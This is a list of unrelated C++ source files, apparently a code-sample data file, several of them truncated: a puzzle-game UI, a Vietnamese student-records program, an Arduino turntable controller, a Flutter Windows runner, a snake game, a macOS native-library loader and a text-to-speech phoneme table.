    "#include \"UiManager.hpp\"\r\n\r\n#include <algorithm> // for std::sort\r\n#include <filesystem>\r\n#include <string>\r\n\r\n#include <SFML/Graphics.hpp>\r\n#include <SFML/System.hpp>\r\n#include <SFML/Window.hpp>\r\n\r\n#include \"GlobalSettings.hpp\"\r\n#include \"imgui-SFML.h\"\r\n#include \"imgui.h\"\r\n#include \"UiSettings.hpp\"\r\n\r\n\r\nvoid CUiManager::Init(sf::RenderWindow& window)\r\n{\r\n    ImGui::SFML::Init(window);\r\n\r\n    GetWorldsToLoad();\r\n}\r\n\r\nvoid CUiManager::Shutdown()\r\n{\r\n    ImGui::SFML::Shutdown();\r\n}\r\n\r\nvoid CUiManager::ProcessEvent(sf::Event event)\r\n{\r\n    ImGui::SFML::ProcessEvent(event);\r\n}\r\n\r\nvoid CUiManager::Update(sf::RenderWindow& window)\r\n{\r\n    ImGui::SFML::Update(window, m_deltaClock.restart());\r\n}\r\n\r\nvoid CUiManager::Begin()\r\n{\r\n    ImGui::Begin(\"Menu\");\r\n}\r\n\r\nvoid CUiManager::Run(sf::RenderWindow& window, CWorld& world, float fps)\r\n{\r\n    Update(window);\r\n\r\n    Begin();\r\n\r\n    HandleUi(window, world, fps);\r\n\r\n    End();\r\n}\r\n\r\nvoid CUiManager::HandleUi(sf::RenderWindow& window, CWorld& world, float fps)\r\n{\r\n    ImGui::TextColored(ImVec4(1, 1, 0, 1), \"General settings\");\r\n\r\n    UpdateWindowTitle(window);\r\n\r\n    ShowFPS(fps);\r\n\r\n    UpdateMousePosition(window);\r\n\r\n    UpdateBackgroundColor();\r\n\r\n    // -------------------------\r\n    ImGui::Separator();\r\n    ImGui::Separator();\r\n    // -------------------------\r\n\r\n    ShowRules();\r\n\r\n    // -------------------------\r\n    ImGui::Separator();\r\n    ImGui::Separator();\r\n    // -------------------------\r\n\r\n    LoadWorld(world);\r\n\r\n    PrintWorldRepresentation(world);\r\n\r\n    // -------------------------\r\n    ImGui::Separator();\r\n    ImGui::Separator();\r\n    // -------------------------\r\n\r\n    Check(world);\r\n    ImGui::SameLine();\r\n    ClearMarks(world);\r\n    ImGui::SameLine();\r\n    Reveal(world);\r\n}\r\n\r\nvoid CUiManager::End()\r\n{\r\n    ImGui::End();\r\n}\r\n\r\nvoid CUiManager::Render(sf::RenderWindow& window)\r\n{\r\n    ImGui::SFML::Render(window);\r\n}\r\n\r\nvoid CUiManager::UpdateWindowTitle(sf::RenderWindow& window)\r\n{\r\n    if (ImGui::InputText(\"Window title\", GlobalSettings::WINDOW_TITLE, 255))\r\n    {\r\n        window.setTitle(GlobalSettings::WINDOW_TITLE);\r\n    }\r\n}\r\n\r\nvoid CUiManager::ShowFPS(float fps)\r\n{\r\n    ImGui::Text(\"FPS: %f\", fps);\r\n}\r\n\r\nvoid CUiManager::UpdateMousePosition(sf::RenderWindow& window)\r\n{\r\n    sf::Vector2i mousePos = sf::Mouse::getPosition(window);\r\n    if (mousePos.x >= 0 && mousePos.x <= GlobalSettings::WINDOW_WIDTH && mousePos.y >= 0 &&\r\n        mousePos.y <= GlobalSettings::WINDOW_HEIGHT)\r\n    {\r\n        ImGui::Text(\"Mouse position: (%d, %d)\", mousePos.x, mousePos.y);\r\n    }\r\n    else\r\n    {\r\n        ImGui::Text(\"Mouse out of window\");\r\n    }\r\n}\r\n\r\nvoid CUiManager::UpdateBackgroundColor()\r\n{\r\n    if (ImGui::ColorEdit3(\"Background color\", GlobalSettings::BACKGROUND_COLOR_INPUT))\r\n    {\r\n        GlobalSettings::BACKGROUND_COLOR.r = static_cast<sf::Uint8>(GlobalSettings::BACKGROUND_COLOR_INPUT[0] * 255.f);\r\n        GlobalSettings::BACKGROUND_COLOR.g = static_cast<sf::Uint8>(GlobalSettings::BACKGROUND_COLOR_INPUT[1] * 255.f);\r\n        GlobalSettings::BACKGROUND_COLOR.b = static_cast<sf::Uint8>(GlobalSettings::BACKGROUND_COLOR_INPUT[2] * 255.f);\r\n    }\r\n}\r\n\r\nvoid CUiManager::ShowRules()\r\n{\r\n    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.2f, 0.9f, 1.0f));\r\n    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.6f, 0.1f, 0.8f, 1.0f));\r\n    if (ImGui::Button(\"Show rules\"))\r\n    {\r\n        ImGui::OpenPopup(\"Rules\");\r\n    }\r\n    ImGui::PopStyleColor(2);\r\n\r\n    if (ImGui::BeginPopupModal(\"Rules\", NULL, ImGuiWindowFlags_AlwaysAutoResize))\r\n    {\r\n        ImGui::Text(\"How to play\");\r\n        ImGui::Separator();\r\n        ImGui::Text(\"1. Your goal is to have exactly one Q(ueen) in each row, column and color region.\");\r\n        ImGui::Text(\"2. Click once to place X and click again for Q. Use X to mark where Q cannot be placed.\");\r\n        ImGui::Text(\"3. Two Q(ueens) cannot touch each other, not even diagonally.\");\r\n        ImGui::Separator();\r\n        if (ImGui::Button(\"Close\", ImVec2(120, 0)))\r\n        {\r\n            ImGui::CloseCurrentPopup();\r\n        }\r\n        ImGui::EndPopup();\r\n    }\r\n}\r\n\r\nvoid CUiManager::PrintWorldRepresentation(CWorld& world)\r\n{\r\n    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.4f, 0.1f, 0.6f, 1.0f));\r\n    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.4f, 0.3f, 0.6f, 1.0f));\r\n    if (ImGui::Button(\"Print world to console\"))\r\n    {\r\n        world.PrintRepresentation();\r\n    }\r\n    ImGui::PopStyleColor(2);\r\n}\r\n\r\nvoid CUiManager::LoadWorld(CWorld& world)\r\n{\r\n    ImGui::TextColored(ImVec4(1, 1, 0, 1), \"Load\");\r\n\r\n    // This prevents the program from crashing from a clean slate (i.e., no worlds have been saved yet)\r\n    if (m_worldsToLoad.empty())\r\n    {\r\n        ImGui::Text(\"Save at least 1 world so worlds can be loaded.\");\r\n        return;\r\n    }\r\n\r\n    if (ImGui::BeginCombo(\"World to load\", m_worldsToLoad[UiSettings::WORLD_CURRENT_INDEX].data(), 0))\r\n    {\r\n        for (int n = 0; n < m_worldsToLoad.size(); n++)\r\n        {\r",
    "#include<iostream>\n#include<string>\n#include<fstream>\n#include<cmath>\n#include <iomanip>\n#include <conio.h>\n#include <cctype>\n\nusing namespace std;\n// m\u1ee5c login******************************************\nstruct login{\n\tstring user;\n\tstring password;\n};\ntypedef struct login LOGIN;\n\nvoid Dangnhap (ifstream &f,LOGIN &sv){\n\tgetline(f,sv.user,',');\n\tgetline(f,sv.password,',');\n}\nstring passwordInput(){\n    string pw;\n    for (char c; (c = getch()); ) {\n        if (c == '\\n' || c == '\\r') { \n            cout << \"\\n\";\n            break;\n        } else if (c == '\\b') { \n            cout << \"\\b \\b\";\n            if (!pw.empty()) pw.erase(pw.size()-1);\n        } else if (c == -32) { \n            _getch(); \n        } else if (isprint(c)){ \n            cout << '*';\n            pw += c;\n        }\n    }\n    return pw;\n}\n// m\u1ee5c t\u00f9y ch\u1ecdn 1 **************************************\nstruct date{\n\tstring ngay ;\n\tstring thang;\n\tstring nam ;\n};\ntypedef struct date DATE;\n\nstruct thongtin{\n\tstring TK;\n\tstring hoten;\n\tstring MSSV;\n\tDATE ngaysinh;\n\tstring khoa;\n\tstring lop;\n};\ntypedef struct thongtin THONGTIN;\n\nvoid Doc_ngay_thang(ifstream &file,DATE &date){\n\tgetline(file,date.ngay,'/');\n\tgetline(file,date.thang,'/');\n\tgetline(file,date.nam,',');\n}\n\nstruct node{\n\tTHONGTIN data;\n\tnode *next;\n};\ntypedef struct node NODE;\nstruct list{\n\tNODE *head;\n\tNODE *tail;\n};\ntypedef struct  list LIST;\nvoid khoitaodanhsach( LIST &l){\n\tl.head=NULL;\n\tl.tail=NULL;\n}\nnode *khoitaonode(THONGTIN x){\n\tNODE *p = new NODE;\n\tif(p==NULL){\n\t\tcout<<\"/n Cap nhat that bai\";\n\t\treturn NULL;\n\t}\n\tp->data=x;\n\tp->next=NULL;\n\treturn p;\n}\n\nvoid themcuoi(LIST &l,NODE *p){\n\tif(l.head==NULL) {\n\tl.head=p;\n\tl.tail=p;\n}\n    else{\n    \tl.tail->next=p;\n    \tl.tail=p;\n\t}\n}\nvoid xoanodedau(LIST &l){\n\tif(l.head==NULL) return;\n\tNODE *p=l.head;\n\tl.head=l.head->next;\n\tdelete p;\n}\nvoid xoanodecuoi(LIST &l){\n\tif(l.head==NULL) return;\n\tfor(NODE *k=l.head;k!=NULL;k=k->next){\n\t\tif(k->next==l.tail){\n\t\t\tdelete l.tail;\n\t\t\tk->next=NULL;\n\t\t\tl.tail=k;\n\t\t}\n\t}\n}\nvoid xoanode(LIST &l,string tai_khoan){\n\tif(l.head->data.TK==tai_khoan){\n\t\txoanodedau(l);\n\t\treturn;\n\t}\n\tif (l.tail->data.TK==tai_khoan){\n\t\txoanodecuoi(l);\n\t\treturn;\n\t}\n\tfor(NODE *k=l.head;k!=NULL;k=k->next){\n\t\tNODE *m;\n\t\tif(k->data.TK==tai_khoan){\n\t\tm->next=k->next;\n\t\tdelete k;\t\n    }m=k;\n}\n}\n\nvoid Doc_Thong_1_Sinh_Vien(ifstream &file,THONGTIN &sv){\n\tgetline(file, sv.TK,',');\n\tgetline(file, sv.hoten,',');\n\tgetline(file, sv.MSSV,',');\n\tDoc_ngay_thang(file,sv.ngaysinh);\n\tgetline(file, sv.khoa,',');\n\tgetline(file, sv.lop);\n}\nvoid xuat(THONGTIN sv){\n    cout<<\"\\n--------------------------------------------------------\";\n\tcout<<\"\\n- Ho va ten:         \"<<sv.hoten;\n\tcout<<\"\\n- Ma so sinh vien:   \"<<sv.MSSV;\n\tcout<<\"\\n- Ngay sinh:         \"<<sv.ngaysinh.ngay<<\"/\"<<sv.ngaysinh.thang<<\"/\"<<sv.ngaysinh.nam;\n\tcout<<\"\\n- Khoa:              \"<<sv.khoa;\n\tcout<<\"\\n- Lop:               \"<<sv.lop<<\"\\n\";\n\tcout<<\"--------------------------------------------------------\\n\";\n}\nvoid Doc_Danh_Sach_Sv(ifstream &file,LIST &l,string tai_khoan){\n\twhile(!file.eof()){\n\t\tTHONGTIN sv;\n\t\tDoc_Thong_1_Sinh_Vien(file,sv);\n\t\tNODE *p=khoitaonode(sv);\n\t\tthemcuoi(l,p);}\n\t}\n\t\n\nvoid\txem(ifstream &file,LIST &l,string tai_khoan){\n\t//Hi\u1ec7n th\u00f4ng tin sinh vi\u00ean \u0111ang \u0111\u0103ng nh\u1eadp\n\t\tfor(NODE *k=l.head;k!=NULL;k=k->next){\n\t\tif(k->data.TK==tai_khoan){\n\t\tcout<<\"\\n\\n\\t\\tTHONG TIN SINH VIEN\\n\";\n\t\txuat(k->data);\n\t    }\n\t}\n\t//thay \u0111\u00f4ir th\u00f4ng tin c\u00e1 nh\u00e2n \n\tcout<<\"bam 1 de thay doi thong tin \";\n\tint thaydoi;\n\tcin>>thaydoi;\n\tif (thaydoi==1){\n\t\txoanode(l,tai_khoan);\n\t cout<<\"vui long cap nhat lai thong tin:\\n\";\n\tTHONGTIN sv;\n\tNODE *g=khoitaonode(sv);\n\tg->data.TK=tai_khoan;\n\tstring o;\n\tcout<<\"- Ho va ten:         \";cin.ignore();getline(cin,o);\n\tg->data.hoten=o;\n\tcout<<\"- Ma so sinh vien:   \";cin>>o;g->data.MSSV=o;\n\tcout<<\"- Ngay sinh:         \";cin>>o;g->data.ngaysinh.ngay=o;\n\tcout<<\"- Thang sinh:        \";cin>>o;g->data.ngaysinh.thang=o;\n\tcout<<\"- Nam sinh:          \";cin>>o;g->data.ngaysinh.nam=o;\n\tcout<<\"- Khoa:              \";cin>>o;g->data.khoa=o;\n\tcout<<\"- Lop:               \";cin>>o;g->data.lop=o;\n\tthemcuoi(l,g);\n\tcout<<\"ban da sua thong tin thanh cong ^^\";\n\tfile.close();\n\tofstream luu;\n\tluu.open(\"THONGTIN2.TXT\",ios::trunc);\n\tfor(NODE *k=l.head;k!=NULL;k=k->next){\n\t\tif(k->data.TK==tai_khoan) xuat(k->data);\n\t\tluu<<k->data.TK<<\",\"<<k->data.hoten<<\",\"<<k->data.MSSV<<\",\";\n\t\tluu<<k->data.ngaysinh.ngay<<\"/\"<<k->data.ngaysinh.thang<<\"/\";\n\t\tluu<<k->data.ngaysinh.nam<<\",\"<<k->data.khoa<<\",\"<<k->data.lop;\n\t\tif(k->next==NULL) break;luu<<\"\\n\";\n    } \n    cout<<\"\\n NEU THONG TIN SAI THI BAN CO THE AN LAI MUC 1 DE NHAP LAI ^^\";\n         luu.close();\n        }\n     }\n\n//m\u1ee5c t\u00f9y ch\u1ecdn 2 va 3********************************************\n\nstruct thongtindiem{\n    string taikhoan;\n    int diemrenluyen;\n    int somonhoc;\n    string tenmon;\n\tint  diemgk;\n\tint diemck;\n\tfloat  heso;\n\tint sotin;\n};\ntypedef struct thongtindiem THONGTINDIEM;\n\nstruct node2{\n\tTHONGTINDIEM data2;\n\tnode2 *next2;\n\tnode2 *diem2;\n};\ntypedef struct no",
    "#include \"Arduino.h\"\n#include \"turntable.h\"\n\nTurntable gTurntable = {1, 0, 0, 1};\n\n// Make one step in half stepping mode\nvoid stepHalf(uint16_t stepDelay, bool rotateCW)\n{\n    static uint8_t counter = 0;\n\n    for (uint8_t i = 0; i < 4; i++)\n    {\n        digitalWrite(MOTOR_PINS[i], HALF_STEPPING_PATTERN[counter][i]);\n    }\n    delayMicroseconds(stepDelay);\n\n    counter = rotateCW ? (counter + 7) % 8 : (counter + 1) % 8;\n}\n\n\n// Make one step in full stepping mode\nvoid stepFull(uint16_t stepDelay, bool rotateCW)\n{\n    static uint8_t counter = 0;\n\n    for (uint8_t i = 0; i < 4; i++)\n    {\n        digitalWrite(MOTOR_PINS[i], FULL_STEPPING_PATTERN[counter][i]);\n    }\n    delayMicroseconds(stepDelay);\n    \n    counter = rotateCW ? (counter + 3) % 4 : (counter + 1) % 4;\n}\n\n\n// Do turntable things\nvoid handleTurntable()\n{    \n    if (gTurntable.sliderSpeed == 0 || gTurntable.direction == RotateDirection::OFF)\n    {\n        for (uint8_t i = 0; i < 4; i++)\n        {\n            digitalWrite(MOTOR_PINS[i], LOW);\n        }\n        return;\n    }\n\n    bool rotateCW = gTurntable.direction == RotateDirection::CW ? true : false;\n\n    switch (gTurntable.mode)\n    {\n        case RotateMode::HALF_STEPPING:\n            stepHalf(gTurntable.delayValue/2, rotateCW);\n            break;\n\n        case RotateMode::FULL_STEPPING:\n            stepFull(gTurntable.delayValue, rotateCW);\n            break;\n\n        default:\n            break;\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"online_banking\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// author: Aryanthepain\n#include \"sp_game_loop.h\"\n\nvoid sp_draw(Snake &snake1, int &food_x, int &food_y, WINDOW *win)\n{\n    // draw food\n    mvwprintw(win, food_y, food_x, \"A\");\n\n    // draw snake1\n    for (size_t i = 0; i < snake1.body.size(); i++)\n    {\n        mvwprintw(win, snake1.body[i].second, snake1.body[i].first, \"O\");\n    }\n}\n\nvoid sp_handle_input(Snake &snake1)\n{\n    int ch = getch();\n    switch (ch)\n    {\n    // coded so that snake can't do 180\n    case 'w':\n        if (snake1.direction == DOWN)\n            break;\n        snake1.direction = UP;\n        break;\n    case 's':\n        if (snake1.direction == UP)\n            break;\n        snake1.direction = DOWN;\n        break;\n    case 'a':\n        if (snake1.direction == RIGHT)\n            break;\n        snake1.direction = LEFT;\n        break;\n    case 'd':\n        if (snake1.direction == LEFT)\n            break;\n        snake1.direction = RIGHT;\n        break;\n    }\n}\n\nbool sp_update_snake(Snake &snake, int max_x, int max_y, int food_x, int food_y)\n{\n    int new_x = snake.body[0].first;\n    int new_y = snake.body[0].second;\n\n    switch (snake.direction)\n    {\n    case UP:\n        new_y--;\n        break;\n    case DOWN:\n        new_y++;\n        break;\n    case LEFT:\n        new_x--;\n        break;\n    case RIGHT:\n        new_x++;\n        break;\n    }\n\n    // Handle boundary conditions (walls wrapping)\n    if (new_x < 1)\n        new_x = max_x - 2;\n    if (new_x >= max_x - 1)\n        new_x = 1;\n    if (new_y < 1)\n        new_y = max_y - 2;\n    if (new_y >= max_y - 1)\n        new_y = 1;\n\n    snake.body.insert(snake.body.begin(), mp(new_x, new_y));\n    if (new_x != food_x || new_y != food_y)\n    {\n        // remove last element if it does not eat the food\n        snake.body.pop_back();\n        return true; // food is still present\n    }\n\n    snake.score++;\n    return false; // no food\n}\n\nbool sp_food_still_present(const Snake &snake1, int food_x, int food_y)\n{\n    // Check if newly generated food collides with snake1\n    for (size_t i = 0; i < snake1.body.size(); i++)\n    {\n        if (food_x == snake1.body[i].first && food_y == snake1.body[i].second)\n            return false;\n    }\n\n    return true;\n}\n\nvoid sp_update_food(bool &food_present, Snake &snake1, int &food_x, int &food_y, int max_x, int max_y)\n{\n    if (food_present)\n        return;\n\n    while (!food_present)\n    {\n        food_x = rand() % (max_x - 2) + 1;\n        food_y = rand() % (max_y - 2) + 1;\n        food_present = true;\n\n        // food could spawn on a snake\n        food_present = sp_food_still_present(snake1, food_x, food_y);\n    }\n\n    return;\n}\n\nbool sp_check_collision(const Snake &snake1)\n{\n    // Check if snake1 collides with itself\n    for (size_t i = 1; i < snake1.body.size(); i++)\n    {\n        if (snake1.body[0] == snake1.body[i])\n            return true;\n    }\n\n    return false;\n}\n\nvoid sp_init_game(Snake &snake1, int &food_x, int &food_y, int max_x, int max_y, WINDOW *win)\n{\n    // Initialize food position\n    food_x = max_x / 2;\n    food_y = max_y / 2;\n\n    // initialise snake 1\n    snake1.body.pb(mp(3, 1));\n    snake1.body.pb(mp(2, 1));\n    snake1.body.pb(mp(1, 1));\n    snake1.direction = RIGHT;\n    snake1.score = 0;\n\n    sp_draw(snake1, food_x, food_y, win);\n}\n\nvoid sp_draw_score(WINDOW *stdscr, int a, int high, int max_y)\n{\n    mvwprintw(stdscr, max_y + 2, 13, \"             \");\n    mvwprintw(stdscr, max_y + 2, 13, \"%d\", a * 10);\n    mvwprintw(stdscr, max_y + 4, 13, \"             \");\n    mvwprintw(stdscr, max_y + 4, 13, \"%d\", high * 10);\n    refresh();\n}\n",
    "//\n//  UrlLoaderNativeLibrary.cpp\n//  UrlLoaderANE\n//\n//  Created by Jo\u00e3o Vitor Borges on 26/08/24.\n//\n\n#include \"UrlLoaderNativeLibrary.hpp\"\n#include <iostream>\n#include <log.hpp>\n#include <string>\n#include <dlfcn.h>\n#include <limits.h>\n#include <crt_externs.h>\n\nstatic void *library = nullptr;\n\nstatic int g_argc = 0;\nstatic char** g_argv = nullptr;\n\nvoid initializeCommandLineArgumentsMacOS() {\n    char** environ_argv = *_NSGetArgv();\n    g_argc = *_NSGetArgc();\n    g_argv = new char*[g_argc + 1];\n    for (int i = 0; i < g_argc; ++i) {\n        size_t len = strlen(environ_argv[i]);\n        g_argv[i] = new char[len + 1];\n        strcpy(g_argv[i], environ_argv[i]);\n    }\n    g_argv[g_argc] = nullptr;\n}\n\n// This function will be called automatically when the shared library is loaded\n__attribute__((constructor)) void initializeLibrary() {\n    initializeCommandLineArgumentsMacOS();\n}\n\nstd::string GetLibraryLocation() {\n    std::string baseDirectory;\n\n    // Check if the argument -extdir was passed\n    for (int i = 0; i < g_argc; ++i) {\n        if (std::string(g_argv[i]) == \"-extdir\" && i + 1 < g_argc) {\n            baseDirectory = g_argv[i + 1];\n            baseDirectory += \"/br.com.redesurftank.aneurlloader.ane\";\n        }\n    }\n    \n    if(baseDirectory.empty()){\n        char buffer[PATH_MAX];\n        if (realpath(g_argv[0], buffer) == nullptr) {\n            std::cerr << \"Error getting real path: \" << strerror(errno) << std::endl;\n            return \"\";\n        }\n        \n        std::string fullPath(buffer);\n        baseDirectory = fullPath.substr(0, fullPath.find_last_of(\"/\"));\n        baseDirectory += \"/META-INF/AIR/extensions/br.com.redesurftank.aneurlloader\";\n    }\n    \n    return baseDirectory + \"/META-INF/ANE/MacOS-x86-64/UrlLoaderNativeLibrary.dylib\";\n}\n\nvoid *loadNativeLibrary() {\n    if (library) {\n        std::cerr << \"Library is already loaded.\" << std::endl;\n        return library;\n    }\n    writeLog(\"Loading native library\");\n    auto libraryPath = GetLibraryLocation();\n    writeLog(libraryPath.c_str());\n#ifdef _WIN32\n    HINSTANCE handle = LoadLibraryA(libraryPath.c_str());\n#else\n    void *handle = dlopen(libraryPath.c_str(), RTLD_LAZY);\n#endif\n\n    if (!handle) {\n#ifdef _WIN32\n        std::cerr << \"Could not load library: \" << GetLastError() << std::endl;\n#else\n        std::cerr << \"Could not load library: \" << dlerror() << std::endl;\n#endif\n        writeLog(\"Could not load library\");\n        return nullptr;\n    }\n\n    writeLog(\"Library loaded\");\n    library = handle;\n    return library;\n}\n\nvoid *getFunctionPointer(const char *functionName) {\n    loadNativeLibrary();\n    if (!library) {\n        std::cerr << \"Library is not loaded.\" << std::endl;\n        return nullptr;\n    }\n\n    void *func = nullptr;\n#ifdef _WIN32\n    func = GetProcAddress((HINSTANCE) library, functionName);\n#else\n    func = dlsym(library, functionName);\n#endif\n\n    if (!func) {\n#ifdef _WIN32\n        std::cerr << \"Could not load function: \" << GetLastError() << std::endl;\n#else\n        std::cerr << \"Could not load function: \" << dlerror() << std::endl;\n#endif\n        writeLog(\"Could not load function\");\n    }\n\n    std::string msg = \"Function loaded: \" + std::string(functionName);\n    writeLog(msg.c_str());\n    return func;\n}\n\n// As fun\u00e7\u00f5es initializerLoader, startLoader e freeId permanecem as mesmas\n\n\nint initializerLoader(void *callBackSuccess, void *callBackError, void *callBackProgress, void *callBackLog) {\n    writeLog(\"Calling initializerLoader\");\n    typedef int (*myFunc)(void *, void *, void *, void *);\n    auto func = (myFunc) getFunctionPointer(\"initializerLoader\");\n    if (!func) {\n        writeLog(\"Could not load function initializerLoader\");\n        return -1;\n    }\n\n    writeLog(\"InitializerLoader called\");\n    auto result = func(callBackSuccess, callBackError, callBackProgress, callBackLog);\n    std::string resultMsg = \"InitializerLoader Result: \" + std::to_string(result);\n    writeLog(resultMsg.c_str());\n    return result;\n}\n\nchar *startLoader(const char *url, const char *method, const char *variables, const char *headers) {\n    writeLog(\"Calling startLoader\");\n    typedef char *(*myFunc)(const char *, const char *, const char *, const char *);\n    auto func = (myFunc) getFunctionPointer(\"startLoad\");\n    if (!func) {\n        writeLog(\"Could not load function startLoader\");\n        return nullptr;\n    }\n\n    writeLog(\"startLoader called\");\n    auto result = func(url, method, variables, headers);\n\n    if (!result) {\n        writeLog(\"startLoader returned null\");\n        return nullptr;\n    }\n\n    std::string resultMsg = \"startLoader Result: \" + std::string(result);\n    writeLog(resultMsg.c_str());\n    return result;\n}\n\nvoid freeId(const char *id) {\n    writeLog(\"Calling freeId\");\n    typedef void (*myFunc)(const char *);\n    auto func = (myFunc) getFunctionPointer(\"freeId\");\n    if (!func) {\n        writeLog(\"Could not load function freeId\");\n        return;\n    }\n\n    writeLog(\"freeId called\");\n    func(id);\n    ",
    "#include <array>\n#include <chrono>\n#include <fstream>\n#include <limits>\n#include <sstream>\n#include <stdexcept>\n#include <codecvt>\n\n#include <onnxruntime_cxx_api.h>\n\n#include \"json.hpp\"\n#include \"piper.hpp\"\n#include \"utf8.h\"\n\nnamespace piper\n{\n\n  std::ofstream logger(\"ttslog.txt\");\n\n  Voice voice;\n\n  SynthesisConfig synthesisConfig;\n\n  static std::map<Phoneme, PhonemeId>\n      DEFAULT_PHONEME_ID_MAP = {\n          {U'_', 0},\n          {U'^', 1},\n          {U'$', 2},\n          {U' ', 3},\n          {U'!', 4},\n          {U'\\'', 5},\n          {U'(', 6},\n          {U')', 7},\n          {U',', 8},\n          {U'-', 9},\n          {U'.', 10},\n          {U':', 11},\n          {U';', 12},\n          {U'?', 13},\n          {U'a', 14},\n          {U'b', 15},\n          {U'c', 16},\n          {U'd', 17},\n          {U'e', 18},\n          {U'f', 19},\n          {U'h', 20},\n          {U'i', 21},\n          {U'j', 22},\n          {U'k', 23},\n          {U'l', 24},\n          {U'm', 25},\n          {U'n', 26},\n          {U'o', 27},\n          {U'p', 28},\n          {U'q', 29},\n          {U'r', 30},\n          {U's', 31},\n          {U't', 32},\n          {U'u', 33},\n          {U'v', 34},\n          {U'w', 35},\n          {U'x', 36},\n          {U'y', 37},\n          {U'z', 38},\n          {U'\u00e6', 39},\n          {U'\u00e7', 40},\n          {U'\u00f0', 41},\n          {U'\u00f8', 42},\n          {U'\u0127', 43},\n          {U'\u014b', 44},\n          {U'\u0153', 45},\n          {U'\u01c0', 46},\n          {U'\u01c1', 47},\n          {U'\u01c2', 48},\n          {U'\u01c3', 49},\n          {U'\u0250', 50},\n          {U'\u0251', 51},\n          {U'\u0252', 52},\n          {U'\u0253', 53},\n          {U'\u0254', 54},\n          {U'\u0255', 55},\n          {U'\u0256', 56},\n          {U'\u0257', 57},\n          {U'\u0258', 58},\n          {U'\u0259', 59},\n          {U'\u025a', 60},\n          {U'\u025b', 61},\n          {U'\u025c', 62},\n          {U'\u025e', 63},\n          {U'\u025f', 64},\n          {U'\u0260', 65},\n          {U'\u0261', 66},\n          {U'\u0262', 67},\n          {U'\u0263', 68},\n          {U'\u0264', 69},\n          {U'\u0265', 70},\n          {U'\u0266', 71},\n          {U'\u0267', 72},\n          {U'\u0268', 73},\n          {U'\u026a', 74},\n          {U'\u026b', 75},\n          {U'\u026c', 76},\n          {U'\u026d', 77},\n          {U'\u026e', 78},\n          {U'\u026f', 79},\n          {U'\u0270', 80},\n          {U'\u0271', 81},\n          {U'\u0272', 82},\n          {U'\u0273', 83},\n          {U'\u0274', 84},\n          {U'\u0275', 85},\n          {U'\u0276', 86},\n          {U'\u0278', 87},\n          {U'\u0279', 88},\n          {U'\u027a', 89},\n          {U'\u027b', 90},\n          {U'\u027d', 91},\n          {U'\u027e', 92},\n          {U'\u0280', 93},\n          {U'\u0281', 94},\n          {U'\u0282', 95},\n          {U'\u0283', 96},\n          {U'\u0284', 97},\n          {U'\u0288', 98},\n          {U'\u0289', 99},\n          {U'\u028a', 100},\n          {U'\u028b', 101},\n          {U'\u028c', 102},\n          {U'\u028d', 103},\n          {U'\u028e', 104},\n          {U'\u028f', 105},\n          {U'\u0290', 106},\n          {U'\u0291', 107},\n          {U'\u0292', 108},\n          {U'\u0294', 109},\n          {U'\u0295', 110},\n          {U'\u0298', 111},\n          {U'\u0299', 112},\n          {U'\u029b', 113},\n          {U'\u029c', 114},\n          {U'\u029d', 115},\n          {U'\u029f', 116},\n          {U'\u02a1', 117},\n          {U'\u02a2', 118},\n          {U'\u02b2', 119},\n          {U'\u02c8', 120},\n          {U'\u02cc', 121},\n          {U'\u02d0', 122},\n          {U'\u02d1', 123},\n          {U'\u02de', 124},\n          {U'\u03b2', 125},\n          {U'\u03b8', 126},\n          {U'\u03c7', 127},\n          {U'\u1d7b', 128},\n          {U'\u2c71', 129},\n          {U'0', 130},\n          {U'1', 131},\n          {U'2', 132},\n          {U'3', 133},\n          {U'4', 134},\n          {U'5', 135},\n          {U'6', 136},\n          {U'7', 137},\n          {U'8', 138},\n          {U'9', 139},\n          {U'\\u0327', 140},\n          {U'\\u0303', 141},\n          {U'\\u032a', 142},\n          {U'\\u032f', 143},\n          {U'\\u0329', 144},\n          {U'\u02b0', 145},\n          {U'\u02e4', 146},\n          {U'\u03b5', 147},\n          {U'\u2193', 148},\n          {U'#', 149},\n          {U'\\\"', 150},\n          {U'\u2191', 151},\n          {U'\\u033a', 152},\n          {U'\\u033b', 153},\n          {U'g', 154},\n          {U'\u02a6', 155},\n          {U'X', 156},\n          {U'\\u031d', 157},\n          {U'\\u030a', 158}};\n\n  void replace(std::string &str, const std::string &from, const std::string &to)\n  {\n    do\n    {\n      size_t start_pos = str.find(from);\n      if (start_pos == std::string::npos)\n        break;\n      str.replace(start_pos, from.length(), to);\n    } while (true);\n  }\n\n  static std::vector<std::string> numbers_units = {\"zero\", \"one\", \"two\", \"three\",\n                                                   \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\", \"ten\", \"eleven\",\n                                                   \"twelve\", \"thirteen\", \"fourteen\", \"fifteen\", \"sixteen\",\n                                                   \"seventeen\", \"eighteen\", \"nineteen\"};\n\n  static std::vector<std::string> numbers_tens = {\"\", \"\", \"twenty\", \"thirty\", \"forty\",\n                                                  \"fifty\", \"sixty\", \"seventy\", \"eighty\", \"ninety\"};\n\n  std::string convert_decimal_places_to_text(std::string i)\n  {\n    std::string ss;\n    for (auto c : i)\n    {\n      // numbers are consecutive",
